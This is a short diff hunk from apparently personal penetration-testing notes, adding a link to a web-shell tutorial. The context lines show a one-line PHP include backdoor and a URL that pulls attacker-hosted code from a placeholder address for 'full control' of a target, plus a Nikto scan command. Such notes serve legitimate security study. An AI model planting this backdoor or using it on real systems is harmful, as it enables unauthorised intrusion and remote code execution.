@@ -186,6 +186,7 @@ Things to be on look for:
      <?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
      Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
      get phpinfo()
+- webshell: https://medium.com/@e.escalante.jr/web-pentesting-workshop-web-shell-reverse-shell-though-file-upload-ex-6-23241c3d7f82
 ```bash
 #Nikto
 nikto -h x.x.x.x
